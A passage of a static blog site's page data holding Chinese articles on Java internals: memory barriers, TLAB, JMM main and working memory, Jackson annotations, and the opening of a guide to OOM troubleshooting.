buffer中的数据刷到内存中，而且这两个操作是异步的。这在多线程环境中，有些情况下是可以接受的，但是有些情况是不可接受的，为了让程序员有能力根据业务需要达到同步完成，就设计了内存屏障。关于内存屏障，后面会细讲。\n\n2、write through：即cpu向内存写数据时，同步完成写store buffer与内存。\n\n当前cpu大多数采用的是write back策略。因为大多数情况下，cpu异步完成写内存产生的部分延迟是可以接受的，而且这个延迟极短。 只有在多线程环境下需要严格保证内存可见等极少数特殊情况下才需要保证cpu的写在外界看来是同步完成的，需要借助cpu提供的内存屏障实现。如果直接采用策略2：write through，那每次写内存都需要等待数据刷入内存，极大影响了cpu的执行效率。\n\n\n# 内存屏障到底是什么？\n\n内存屏障什么都不是，它只是一个抽象概念，就像oop。如果这样说你不理解，那你把他理解成一堵墙，这堵墙正面与反面的指令无法被cpu乱序执行及这堵墙正面与反面的读写操作需有序执行。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"浅析java中的TLAB",frontmatter:{title:"浅析java中的TLAB",date:"2022-04-17T23:21:45.000Z",permalink:"/pages/f0e774/",categories:["java","jvm"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/03.%E6%B5%85%E6%9E%90java%E4%B8%AD%E7%9A%84TLAB.html",relativePath:"04.java/05.jvm/03.浅析java中的TLAB.md",key:"v-4da52620",path:"/pages/f0e774/",headers:[{level:2,title:"new对象与指针碰撞",slug:"new对象与指针碰撞",normalizedTitle:"new对象与指针碰撞",charIndex:54},{level:2,title:"TLAB的出现",slug:"tlab的出现",normalizedTitle:"tlab的出现",charIndex:626},{level:2,title:"TLAB的缺点",slug:"tlab的缺点",normalizedTitle:"tlab的缺点",charIndex:1294}],headersStr:"new对象与指针碰撞 TLAB的出现 TLAB的缺点",content:"什么是TLAB？它是干什么的？咋们先抛开这个问题，一切的开始得从new对象到指针碰撞开始讲起。\n\n\n> # new对象与指针碰撞\n\nnew对象怎么就出问题了呢？ java中我们要创建一个对象,用关键字new就可以了。但是，在我们日常中，有很多生命周期很短的对象。比如：\n\npublic void dome(){\n    User user=new user();\n    user.sayhi();\n} \n\n\n1\n2\n3\n4\n\n\n这种对象的作用域都不会逃逸出方法外，也就是说该对象的生命周期会随着方法的调用开始而开始，方法的调用结束而结束。 假设JVM所有的对象都放在堆内存中(为什么用假设，因为JVM并不是这样)一旦方法结束，没有了指向该对象的引用，该对象就需要被GC回收，如果存在很多这样的情况，对GC来说压力山大呀。\n\n那么什么又是指针碰撞呢？ 假设JVM虚拟机上，堆内存都是规整的。堆内存被一个指针一分为二。指针的左边都被塞满了对象，指针的右变是未使用的区域。每一次有新的对象创建，指针就会向右移动一个对象size的距离。这就被称为指针碰撞。\n\n\n\n图1.png\n\n好，问题来了。如果我们用多线程执行刚才的dome方法，一个线程正在给A对象分配内存，指针还没有来的及修改，同时为B对象分配内存的线程，仍引用这之前的指针指向。这样就出现毛病了。 (要注意的是，上面两种情况解决方案不止一个，我今天主要是讲TLAB，其他方案自行查询)\n\n\n> # TLAB的出现\n\n我们现在已经搞清楚，我们出现了哪些问题。我在为大家介绍一下今天的主角。\n\nTLAB的全称是Thread Local Allocation Buffer，即线程本地分配缓存区，这是一个线程专用的内存分配区域。\n\n如果设置了虚拟机参数 -XX:UseTLAB，在线程初始化时，同时也会申请一块指定大小的内存，只给当前线程使用，这样每个线程都单独拥有一个空间，如果需要分配内存，就在自己的空间上分配，这样就不存在竞争的情况，可以大大提升分配效率。\n\nTLAB空间的内存非常小，缺省情况下仅占有整个Eden空间的1%，也可以通过选项-XX:TLABWasteTargetPercent设置TLAB空间所占用Eden空间的百分比大小。\n\nTLAB的本质其实是三个指针管理的区域：start，top 和 end，每个线程都会从Eden分配一块空间，例如说100KB，作为自己的TLAB，其中 start 和 end 是占位用的，标识出 eden 里被这个 TLAB 所管理的区域，卡住eden里的一块空间不让其它线程来这里分配。\n\nTLAB只是让每个线程有私有的分配指针，但底下存对象的内存空间还是给所有线程访问的，只是其它线程无法在这个区域分配而已。从这一点看，它被翻译为 线程私有分配区 更为合理一点 当一个TLAB用满（分配指针top撞上分配极限end了），就新申请一个TLAB，而在老TLAB里的对象还留在原地什么都不用管——它们无法感知自己是否是曾经从TLAB分配出来的，而只关心自己是在eden里分配的。\n\n\n> # TLAB的缺点\n\n事务总不是完美的，TLAB也又自己的缺点。因为TLAB通常很小，所以放不下大对象。 1，TLAB空间大小是固定的，但是这时候一个大对象，我TLAB剩余的空间已经容不下它了。(比如100kb的TLAB，来了个110KB的对象) 2，TLAB空间还剩一点点没有用到，有点舍不得。(比如100kb的TLAB，装了80KB，又来了个30KB的对象) 所以JVM开发人员做了以下处理，设置了最大浪费空间。 当剩余的空间小于最大浪费空间，那该TLAB属于的线程在重新向Eden区申请一个TLAB空间。进行对象创建，还是空间不够，那你这个对象太大了，去Eden区直接创建吧！ 当剩余的空间大于最大浪费空间，那这个大对象请你直接去Eden区创建，我TLAB放不下没有使用完的空间。\n\n当然，又回造成新的病垢。 3，Eden空间够的时候，你再次申请TLAB没问题，我不够了，Heap的Eden区要开始GC， 4，TLAB允许浪费空间，导致Eden区空间不连续，积少成多。以后还要人帮忙打理。",normalizedContent:"什么是tlab？它是干什么的？咋们先抛开这个问题，一切的开始得从new对象到指针碰撞开始讲起。\n\n\n> # new对象与指针碰撞\n\nnew对象怎么就出问题了呢？ java中我们要创建一个对象,用关键字new就可以了。但是，在我们日常中，有很多生命周期很短的对象。比如：\n\npublic void dome(){\n    user user=new user();\n    user.sayhi();\n} \n\n\n1\n2\n3\n4\n\n\n这种对象的作用域都不会逃逸出方法外，也就是说该对象的生命周期会随着方法的调用开始而开始，方法的调用结束而结束。 假设jvm所有的对象都放在堆内存中(为什么用假设，因为jvm并不是这样)一旦方法结束，没有了指向该对象的引用，该对象就需要被gc回收，如果存在很多这样的情况，对gc来说压力山大呀。\n\n那么什么又是指针碰撞呢？ 假设jvm虚拟机上，堆内存都是规整的。堆内存被一个指针一分为二。指针的左边都被塞满了对象，指针的右变是未使用的区域。每一次有新的对象创建，指针就会向右移动一个对象size的距离。这就被称为指针碰撞。\n\n\n\n图1.png\n\n好，问题来了。如果我们用多线程执行刚才的dome方法，一个线程正在给a对象分配内存，指针还没有来的及修改，同时为b对象分配内存的线程，仍引用这之前的指针指向。这样就出现毛病了。 (要注意的是，上面两种情况解决方案不止一个，我今天主要是讲tlab，其他方案自行查询)\n\n\n> # tlab的出现\n\n我们现在已经搞清楚，我们出现了哪些问题。我在为大家介绍一下今天的主角。\n\ntlab的全称是thread local allocation buffer，即线程本地分配缓存区，这是一个线程专用的内存分配区域。\n\n如果设置了虚拟机参数 -xx:usetlab，在线程初始化时，同时也会申请一块指定大小的内存，只给当前线程使用，这样每个线程都单独拥有一个空间，如果需要分配内存，就在自己的空间上分配，这样就不存在竞争的情况，可以大大提升分配效率。\n\ntlab空间的内存非常小，缺省情况下仅占有整个eden空间的1%，也可以通过选项-xx:tlabwastetargetpercent设置tlab空间所占用eden空间的百分比大小。\n\ntlab的本质其实是三个指针管理的区域：start，top 和 end，每个线程都会从eden分配一块空间，例如说100kb，作为自己的tlab，其中 start 和 end 是占位用的，标识出 eden 里被这个 tlab 所管理的区域，卡住eden里的一块空间不让其它线程来这里分配。\n\ntlab只是让每个线程有私有的分配指针，但底下存对象的内存空间还是给所有线程访问的，只是其它线程无法在这个区域分配而已。从这一点看，它被翻译为 线程私有分配区 更为合理一点 当一个tlab用满（分配指针top撞上分配极限end了），就新申请一个tlab，而在老tlab里的对象还留在原地什么都不用管——它们无法感知自己是否是曾经从tlab分配出来的，而只关心自己是在eden里分配的。\n\n\n> # tlab的缺点\n\n事务总不是完美的，tlab也又自己的缺点。因为tlab通常很小，所以放不下大对象。 1，tlab空间大小是固定的，但是这时候一个大对象，我tlab剩余的空间已经容不下它了。(比如100kb的tlab，来了个110kb的对象) 2，tlab空间还剩一点点没有用到，有点舍不得。(比如100kb的tlab，装了80kb，又来了个30kb的对象) 所以jvm开发人员做了以下处理，设置了最大浪费空间。 当剩余的空间小于最大浪费空间，那该tlab属于的线程在重新向eden区申请一个tlab空间。进行对象创建，还是空间不够，那你这个对象太大了，去eden区直接创建吧！ 当剩余的空间大于最大浪费空间，那这个大对象请你直接去eden区创建，我tlab放不下没有使用完的空间。\n\n当然，又回造成新的病垢。 3，eden空间够的时候，你再次申请tlab没问题，我不够了，heap的eden区要开始gc， 4，tlab允许浪费空间，导致eden区空间不连续，积少成多。以后还要人帮忙打理。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"为啥加锁可以解决可见性问题呢？",frontmatter:{title:"为啥加锁可以解决可见性问题呢？",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/7844f9/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/04.%E4%B8%BA%E5%95%A5%E5%8A%A0%E9%94%81%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%86%B3%E5%8F%AF%E8%A7%81%E6%80%A7%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F.html",relativePath:"04.java/05.jvm/04.为啥加锁可以解决可见性问题呢？.md",key:"v-0d75279a",path:"/pages/7844f9/",headersStr:null,content:"因为某一个线程进入synchronized代码块前后，线程会获得锁,清空工作内存，从主内存拷贝共享变量最新的值到工作内存成为副本，执行代码，将修改后的副本的值刷新回主内存中，线程释放锁。\n\n而获取不到锁的线程会阻塞等待，所以变量的值肯定一直都是最新的。",normalizedContent:"因为某一个线程进入synchronized代码块前后，线程会获得锁,清空工作内存，从主内存拷贝共享变量最新的值到工作内存成为副本，执行代码，将修改后的副本的值刷新回主内存中，线程释放锁。\n\n而获取不到锁的线程会阻塞等待，所以变量的值肯定一直都是最新的。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"主内存和工作内存的关系",frontmatter:{title:"主内存和工作内存的关系",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/53d695/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/05.%E4%B8%BB%E5%86%85%E5%AD%98%E5%92%8C%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AD%98%E7%9A%84%E5%85%B3%E7%B3%BB.html",relativePath:"04.java/05.jvm/05.主内存和工作内存的关系.md",key:"v-215b6f1c",path:"/pages/53d695/",headers:[{level:2,title:"什么是主内存和工作内存",slug:"什么是主内存和工作内存",normalizedTitle:"什么是主内存和工作内存",charIndex:699},{level:2,title:"主内存和工作内存的关系",slug:"主内存和工作内存的关系",normalizedTitle:"主内存和工作内存的关系",charIndex:941}],headersStr:"什么是主内存和工作内存 主内存和工作内存的关系",content:"CPU 有多级缓存，导致读的数据过期 由于 CPU 的处理速度很快，相比之下，内存的速度就显得很慢，所以为了提高 CPU 的整体运行效率，减少空闲时间，在 CPU 和内存之间会有 cache 层，也就是缓存层的存在。虽然缓存的容量比内存小，但是缓存的速度却比内存的速度要快得多，其中 L1 缓存的速度仅次于寄存器的速度。结构示意图如下所示：\n\n在图中，从下往上分别是内存，L3 缓存、L2 缓存、L1 缓存，寄存器，然后最上层是 CPU 的 4个核心。从内存，到 L3 缓存，再到 L2 和 L1 缓存，它们距离 CPU 的核心越来越近了，越靠近核心，其容量就越小，但是速度也越快。正是由于缓存层的存在，才让我们的 CPU 能发挥出更好的性能。\n\n其实，线程间对于共享变量的可见性问题，并不是直接由多核引起的，而是由我们刚才讲到的这些 L3 缓存、L2 缓存、L1 缓存，也就是多级缓存引起的：每个核心在获取数据时，都会将数据从内存一层层往上读取，同样，后续对于数据的修改也是先写入到自己的 L1 缓存中，然后等待时机再逐层往下同步，直到最终刷回内存。\n\n假设 core 1 修改了变量 a 的值，并写入到了 core 1 的 L1 缓存里，但是还没来得及继续往下同步，由于 core 1 有它自己的的 L1 缓存，core 4 是无法直接读取 core 1 的 L1 缓存的值的，那么此时对于 core 4 而言，变量 a 的值就不是 core 1 修改后的最新的值，core 4 读取到的值可能是一个过期的值，从而引起多线程时可见性问题的发生。\n\n\n# JMM的抽象：主内存和工作内存\n\n\n# 什么是主内存和工作内存\n\nJava 作为高级语言，屏蔽了 L1 缓存、L2 缓存、L3 缓存，也就是多层缓存的这些底层细节，用 JMM 定义了一套读写数据的规范。我们不再需要关心 L1 缓存、L2 缓存、L3 缓存等多层缓存的问题，我们只需要关心 JMM 抽象出来的主内存和工作内存的概念。为了更方便你去理解，可参考下图： 每个线程只能够直接接触到工作内存，无法直接操作主内存，而工作内存中所保存的正是主内存的共享变量的副本，主内存和工作内存之间的通信是由 JMM 控制的。\n\n\n# 主内存和工作内存的关系\n\nJMM 有以下规定：\n\n（1）所有的变量都存储在主内存中，同时每个线程拥有自己独立的工作内存，而工作内存中的变量的内容是主内存中该变量的拷贝；\n\n（2）线程不能直接读 / 写主内存中的变量，但可以操作自己工作内存中的变量，然后再同步到主内存中，这样，其他线程就可以看到本次修改；\n\n（3） 主内存是由多个线程所共享的，但线程间不共享各自的工作内存，如果线程间需要通信，则必须借助主内存中转来完成。\n\n听到这里，你对上图的理解可能会更深刻一些，从图中可以看出，每个工作内存中的变量都是对主内存变量的一个拷贝，相当于是一个副本。而且图中没有一条线是可以直接连接各个工作内存的，因为工作内存之间的通信，都需要通过主内存来中转。\n\n正是由于所有的共享变量都存在于主内存中，每个线程有自己的工作内存，其中存储的是变量的副本，所以这个副本就有可能是过期的，我们来举个例子：如果一个变量 x 被线程 A 修改了，只要还没同步到主内存中，线程 B 就看不到，所以此时线程 B 读取到的 x 值就是一个过期的值，这就导致了可见性问题。\n\nCPU 的多层缓存结构，以及由此抽象出来的 JMM 主内存和工作内存的结构图，并且还说了主内存和工作内存之间的关系。\n\njava:volalite关键字",normalizedContent:"cpu 有多级缓存，导致读的数据过期 由于 cpu 的处理速度很快，相比之下，内存的速度就显得很慢，所以为了提高 cpu 的整体运行效率，减少空闲时间，在 cpu 和内存之间会有 cache 层，也就是缓存层的存在。虽然缓存的容量比内存小，但是缓存的速度却比内存的速度要快得多，其中 l1 缓存的速度仅次于寄存器的速度。结构示意图如下所示：\n\n在图中，从下往上分别是内存，l3 缓存、l2 缓存、l1 缓存，寄存器，然后最上层是 cpu 的 4个核心。从内存，到 l3 缓存，再到 l2 和 l1 缓存，它们距离 cpu 的核心越来越近了，越靠近核心，其容量就越小，但是速度也越快。正是由于缓存层的存在，才让我们的 cpu 能发挥出更好的性能。\n\n其实，线程间对于共享变量的可见性问题，并不是直接由多核引起的，而是由我们刚才讲到的这些 l3 缓存、l2 缓存、l1 缓存，也就是多级缓存引起的：每个核心在获取数据时，都会将数据从内存一层层往上读取，同样，后续对于数据的修改也是先写入到自己的 l1 缓存中，然后等待时机再逐层往下同步，直到最终刷回内存。\n\n假设 core 1 修改了变量 a 的值，并写入到了 core 1 的 l1 缓存里，但是还没来得及继续往下同步，由于 core 1 有它自己的的 l1 缓存，core 4 是无法直接读取 core 1 的 l1 缓存的值的，那么此时对于 core 4 而言，变量 a 的值就不是 core 1 修改后的最新的值，core 4 读取到的值可能是一个过期的值，从而引起多线程时可见性问题的发生。\n\n\n# jmm的抽象：主内存和工作内存\n\n\n# 什么是主内存和工作内存\n\njava 作为高级语言，屏蔽了 l1 缓存、l2 缓存、l3 缓存，也就是多层缓存的这些底层细节，用 jmm 定义了一套读写数据的规范。我们不再需要关心 l1 缓存、l2 缓存、l3 缓存等多层缓存的问题，我们只需要关心 jmm 抽象出来的主内存和工作内存的概念。为了更方便你去理解，可参考下图： 每个线程只能够直接接触到工作内存，无法直接操作主内存，而工作内存中所保存的正是主内存的共享变量的副本，主内存和工作内存之间的通信是由 jmm 控制的。\n\n\n# 主内存和工作内存的关系\n\njmm 有以下规定：\n\n（1）所有的变量都存储在主内存中，同时每个线程拥有自己独立的工作内存，而工作内存中的变量的内容是主内存中该变量的拷贝；\n\n（2）线程不能直接读 / 写主内存中的变量，但可以操作自己工作内存中的变量，然后再同步到主内存中，这样，其他线程就可以看到本次修改；\n\n（3） 主内存是由多个线程所共享的，但线程间不共享各自的工作内存，如果线程间需要通信，则必须借助主内存中转来完成。\n\n听到这里，你对上图的理解可能会更深刻一些，从图中可以看出，每个工作内存中的变量都是对主内存变量的一个拷贝，相当于是一个副本。而且图中没有一条线是可以直接连接各个工作内存的，因为工作内存之间的通信，都需要通过主内存来中转。\n\n正是由于所有的共享变量都存在于主内存中，每个线程有自己的工作内存，其中存储的是变量的副本，所以这个副本就有可能是过期的，我们来举个例子：如果一个变量 x 被线程 a 修改了，只要还没同步到主内存中，线程 b 就看不到，所以此时线程 b 读取到的 x 值就是一个过期的值，这就导致了可见性问题。\n\ncpu 的多层缓存结构，以及由此抽象出来的 jmm 主内存和工作内存的结构图，并且还说了主内存和工作内存之间的关系。\n\njava:volalite关键字",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"jackson中@JsonProperty、@JsonIgnore等常用注解总结",frontmatter:{title:"jackson中@JsonProperty、@JsonIgnore等常用注解总结",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/f4ef8d/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/06.jackson%E4%B8%AD@JsonProperty%E3%80%81@JsonIgnore%E7%AD%89%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3%E6%80%BB%E7%BB%93.html",relativePath:"04.java/05.jvm/06.jackson中@JsonProperty、@JsonIgnore等常用注解总结.md",key:"v-7e1d0cd0",path:"/pages/f4ef8d/",headersStr:null,content:'# 1. @JsonProperty\n\n此注解用于属性上，作用是把该属性的名称序列化为另外一个名称，如把trueName属性序列化为name，@JsonProperty("name")。\n\n对属性名称重命名，比如在很多场景下Java对象的属性是按照规范的驼峰书写，但在数据库设计时使用的是下划线连接方式，此处在进行映射的时候\n\n就可以使用该注解。\n\n例如：使用该注解将以下表结构转化为Javabean：\n\n\n\npublic class CustomerInfo{\n    \n    private int id;\n    //使用 @JsonProperty注解将表结构中的字段映射到实体类中\n    @JsonProperty("customer_name")\n    private String customerName;\n    \n    @JsonProperty("customer_id")\n    private String customerId;\n    \n    @JsonProperty("product_id")\n    private String productId;\n    \n    @JsonProperty("source_address")\n    private String sourceAddress;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getCustomerName() {\n        return customerName;\n    }\n\n    public void setCustomerName(String customerName) {\n        this.customerName = customerName;\n    }\n\n    public String getCustomerId() {\n        return customerId;\n    }\n\n    public void setCustomerId(String customerId) {\n        this.customerId = customerId;\n    }\n\n    public String getProductId() {\n        return productId;\n    }\n\n    public void setProductId(String productId) {\n        this.productId = productId;\n    }\n\n    public String getSourceAddress() {\n        return sourceAddress;\n    }\n\n    public void setSourceAddress(String sourceAddress) {\n        this.sourceAddress = sourceAddress;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n\n# 2.@JsonIgnore\n\n此注解用于属性或者方法上（最好是属性上），用来完全忽略被注解的字段和方法对应的属性，即便这个字段或方法可以被自动检测到或者还有其他的注解，一般标记在属性或者方法上，返回的json数据即不包含该属性。\n\n使用情景：需要把一个List<CustomerInfo>转换成json格式的数据传递给前台。但实体类中基本属性字段的值都存储在快照属性字段中。此时我可以在业务层中做处理，\n\n把快照属性字段的值赋给实体类中对应的基本属性字段。最后，我希望返回的json数据中不包含这两个快照字段，那么在实体类中快照属性上加注解@JsonIgnore，\n\n那么最后返回的json数据，将不会包含customerId和***productId***两个属性值。\n\npublic class CustomerInfo {\n    \n    private int id;\n    \n    private String customerName;\n\t\n    //使用 @JsonIgnore注解在生成json数据时，忽略该字段\n    @JsonIgnore\n    private String customerId;\n\t\n    //使用 @JsonIgnore注解在生成json数据时，忽略该字段\n    @JsonIgnore\n    private String productId;\n    \n    private String sourceAddress;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getCustomerName() {\n        return customerName;\n    }\n\n    public void setCustomerName(String customerName) {\n        this.customerName = customerName;\n    }\n\n    public String getCustomerId() {\n        return customerId;\n    }\n\n    public void setCustomerId(String customerId) {\n        this.customerId = customerId;\n    }\n\n    public String getProductId() {\n        return productId;\n    }\n\n    public void setProductId(String productId) {\n        this.productId = productId;\n    }\n\n    public String getSourceAddress() {\n        return sourceAddress;\n    }\n\n    public void setSourceAddress(String sourceAddress) {\n        this.sourceAddress = sourceAddress;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n\n# 3. @JsonIgnoreProperties\n\n此注解是类注解，作用是json序列化时将java bean中的一些属性忽略掉，序列化和反序列化都受影响。\n\n\n# 4. @JsonFormat\n\n此注解用于属性或者方法上（最好是属性上），可以方便的把Date类型直接转化为我们想要的模式。\n\n例子：@JsonFormat(pattern="yyyy-MM-dd hh:mm:ss")\n\n@JsonFormat(pattern="yyyy-MM-dd HH:mm:ss") \nprivate Date updateTime;\n\n\n1\n2\n\n\n\n# 5. @JsonSerialize\n\n此注解用于属性或者getter方法上，用于在序列化时嵌入我们自定义的代码，比如序列化一个double时在其后面限制两位小数点。\n\n\n# 6. @JsonDeserialize\n\n此注解用于属性或者setter方法上，用于在反序列化时可以嵌入我们自定义的代码，类似于上面的@JsonSerialize。\n\n\n# 7. @JsonInclude\n\n属性值为null的不参与序列化。例子：@JsonInclude(Include.NON_NULL)',normalizedContent:'# 1. @jsonproperty\n\n此注解用于属性上，作用是把该属性的名称序列化为另外一个名称，如把truename属性序列化为name，@jsonproperty("name")。\n\n对属性名称重命名，比如在很多场景下java对象的属性是按照规范的驼峰书写，但在数据库设计时使用的是下划线连接方式，此处在进行映射的时候\n\n就可以使用该注解。\n\n例如：使用该注解将以下表结构转化为javabean：\n\n\n\npublic class customerinfo{\n    \n    private int id;\n    //使用 @jsonproperty注解将表结构中的字段映射到实体类中\n    @jsonproperty("customer_name")\n    private string customername;\n    \n    @jsonproperty("customer_id")\n    private string customerid;\n    \n    @jsonproperty("product_id")\n    private string productid;\n    \n    @jsonproperty("source_address")\n    private string sourceaddress;\n\n    public int getid() {\n        return id;\n    }\n\n    public void setid(int id) {\n        this.id = id;\n    }\n\n    public string getcustomername() {\n        return customername;\n    }\n\n    public void setcustomername(string customername) {\n        this.customername = customername;\n    }\n\n    public string getcustomerid() {\n        return customerid;\n    }\n\n    public void setcustomerid(string customerid) {\n        this.customerid = customerid;\n    }\n\n    public string getproductid() {\n        return productid;\n    }\n\n    public void setproductid(string productid) {\n        this.productid = productid;\n    }\n\n    public string getsourceaddress() {\n        return sourceaddress;\n    }\n\n    public void setsourceaddress(string sourceaddress) {\n        this.sourceaddress = sourceaddress;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n\n# 2.@jsonignore\n\n此注解用于属性或者方法上（最好是属性上），用来完全忽略被注解的字段和方法对应的属性，即便这个字段或方法可以被自动检测到或者还有其他的注解，一般标记在属性或者方法上，返回的json数据即不包含该属性。\n\n使用情景：需要把一个list<customerinfo>转换成json格式的数据传递给前台。但实体类中基本属性字段的值都存储在快照属性字段中。此时我可以在业务层中做处理，\n\n把快照属性字段的值赋给实体类中对应的基本属性字段。最后，我希望返回的json数据中不包含这两个快照字段，那么在实体类中快照属性上加注解@jsonignore，\n\n那么最后返回的json数据，将不会包含customerid和***productid***两个属性值。\n\npublic class customerinfo {\n    \n    private int id;\n    \n    private string customername;\n\t\n    //使用 @jsonignore注解在生成json数据时，忽略该字段\n    @jsonignore\n    private string customerid;\n\t\n    //使用 @jsonignore注解在生成json数据时，忽略该字段\n    @jsonignore\n    private string productid;\n    \n    private string sourceaddress;\n\n    public int getid() {\n        return id;\n    }\n\n    public void setid(int id) {\n        this.id = id;\n    }\n\n    public string getcustomername() {\n        return customername;\n    }\n\n    public void setcustomername(string customername) {\n        this.customername = customername;\n    }\n\n    public string getcustomerid() {\n        return customerid;\n    }\n\n    public void setcustomerid(string customerid) {\n        this.customerid = customerid;\n    }\n\n    public string getproductid() {\n        return productid;\n    }\n\n    public void setproductid(string productid) {\n        this.productid = productid;\n    }\n\n    public string getsourceaddress() {\n        return sourceaddress;\n    }\n\n    public void setsourceaddress(string sourceaddress) {\n        this.sourceaddress = sourceaddress;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n\n# 3. @jsonignoreproperties\n\n此注解是类注解，作用是json序列化时将java bean中的一些属性忽略掉，序列化和反序列化都受影响。\n\n\n# 4. @jsonformat\n\n此注解用于属性或者方法上（最好是属性上），可以方便的把date类型直接转化为我们想要的模式。\n\n例子：@jsonformat(pattern="yyyy-mm-dd hh:mm:ss")\n\n@jsonformat(pattern="yyyy-mm-dd hh:mm:ss") \nprivate date updatetime;\n\n\n1\n2\n\n\n\n# 5. @jsonserialize\n\n此注解用于属性或者getter方法上，用于在序列化时嵌入我们自定义的代码，比如序列化一个double时在其后面限制两位小数点。\n\n\n# 6. @jsondeserialize\n\n此注解用于属性或者setter方法上，用于在反序列化时可以嵌入我们自定义的代码，类似于上面的@jsonserialize。\n\n\n# 7. @jsoninclude\n\n属性值为null的不参与序列化。例子：@jsoninclude(include.non_null)',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Java OOM问题如何排查",frontmatter:{title:"Java OOM问题如何排查",date:"2022-04-17T23:21:45.000Z",permalink:"/pages/8f8483/",categories:["java","jvm"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/07.Java%20OOM%E9%97%AE%E9%A2%98%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5.html",relativePath:"04.java/05.jvm/07.Java OOM问题如何排查.md",key:"v-7682f22e",path:"/pages/8f8483/",headers:[{level:2,title:"什么是OOM",slug:"什么是oom",normalizedTitle:"什么是oom",charIndex:2},{level:2,title:"导致OOM问题的原因",slug:"导致oom问题的原因",normalizedTitle:"导致oom问题的原因",charIndex:133},{level:2,title:"排查手段",slug:"排查手段",normalizedTitle:"排查手段",charIndex:937},{level:3,title:"实战",slug:"实战",normalizedTitle:"实战",charIndex:1270},{level:2,title:"MAT分析",slug:"mat分析",normalizedTitle:"mat分析",charIndex:2424}],headersStr:"什么是OOM 导致OOM问题的原因 排查手段 实战 MAT分析",content:'# 什么是OOM\n\nOOM为out of memory的简称，来源于java.lang.OutOfMemoryError，指程序需要的内存空间大于系统分配的内存空间，OOM后果就是程序crash；可以通俗理解：程序申请内存过大，虚拟机无法满足，然后自杀了。\n\n\n# 导致OOM问题的原因\n\n为什么会没有内存了呢？原因不外乎有两点：\n\n1）分配的少了：比如虚拟机本身可使用的内存（一般通过启动时的VM参数指定）太少。\n\n2）应用用的太多，并且用完没释放，浪费了。此时就会造成内存泄露或者内存溢出。\n\n内存泄露：申请使用完的内存没有释放，导致虚拟机不能再次使用该内存，此时这段内存就泄露了，因为申请者不用了，而又不能被虚拟机分配给别人用。\n\n内存溢出：申请的内存超出了JVM能提供的内存大小，此时称之为溢出。\n\n最常见的OOM情况有以下三种：\n\n * java.lang.OutOfMemoryError: Java heap space ------\x3ejava堆内存溢出，此种情况最常见，一般由于内存泄露或者堆的大小设置不当引起。对于内存泄露，需要通过内存监控软件查找程序中的泄露代码，而堆大小可以通过虚拟机参数-Xms,-Xmx等修改。\n * java.lang.OutOfMemoryError: PermGen space 或 java.lang.OutOfMemoryError：MetaSpace ------\x3ejava方法区，（java8 元空间）溢出了，一般出现于大量Class或者jsp页面，或者采用cglib等反射机制的情况，因为上述情况会产生大量的Class信息存储于方法区。此种情况可以通过更改方法区的大小来解决，使用类似-XX:PermSize=64m -XX:MaxPermSize=256m的形式修改。另外，过多的常量尤其是字符串也会导致方法区溢出。\n * java.lang.StackOverflowError ------\x3e 不会抛OOM error，但也是比较常见的Java内存溢出。JAVA虚拟机栈溢出，一般是由于程序中存在死循环或者深度递归调用造成的，栈大小设置太小也会出现此种溢出。可以通过虚拟机参数-Xss来设置栈的大小。\n\n\n# 排查手段\n\n一般手段是：先通过内存映像工具对Dump出来的堆转储快照进行分析，重点是确认内存中的对象是否是必要的，也就是要先分清楚到底是出现了内存泄漏还是内存溢出。\n\n * 如果是内存泄漏，可进一步通过工具查看泄漏对象到GC 